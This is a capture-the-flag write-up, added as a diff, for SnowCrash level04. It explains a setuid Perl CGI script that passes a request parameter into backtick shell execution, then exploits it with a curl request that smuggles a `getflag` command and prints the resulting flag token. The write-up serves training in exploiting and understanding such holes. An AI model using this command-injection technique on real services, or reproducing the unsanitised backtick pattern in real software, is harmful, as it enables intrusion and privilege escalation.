@@ -1,0 +1,45 @@
+As always we first ls -la to see what is all given to us and the permissions that is given with it
+level04@SnowCrash:~$ ls -la
+total 16
+dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
+-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
+-r-x------  1 level04 level04  675 Apr  3  2012 .profile
+-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
+
+# Notice the important part in the rights of level04. It uses suid which is a massive danger and this is out gate way into the system. It shares
+	user rights with us and will allow us to use the getflag command. As this give us elevated user rights and allows us to exploit it.
+	It allows to run the programm as elevated rights, making it run as the user.
+
+# You can see a perl script in the home, and that the script is running in background on the :4747 port
+# We will use curl request to do this
+
+# By looking into the perl script
+
+#!/usr/bin/perl
+# localhost:4747			# HTTP module here
+use CGI qw{param};			# Handle Common Gateway Interface requests and responses. "use CGI qw(:standard);" is for Function Oriented programming.
+print "Content-type: text/html\n\n";
+sub x {						# This is a subroutine (Function)
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));				# This is the call the to subroutine (Function) varible x
+
+Let's see what we can do with it using curl
+level04@SnowCrash:~$ curl localhost:4747?x=hello		# Note we must use variable x as this is the parameter it takes
+hello
+
+# You can see that they use the http module and print the "x" get params and    
+#	echo it with the system echo so you can exploit it as follow, because it's launched with the flag04 user
+
+ curl localhost:4747?x=\`getflag\`
+
+ Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+
+further read
+https://www.pentestpartners.com/security-blog/exploiting-suid-executables/
+https://www.mattandreko.com/2011/12/08/exploit-exercises-nebula-07/
+https://www.rosehosting.com/blog/curl-command-examples/
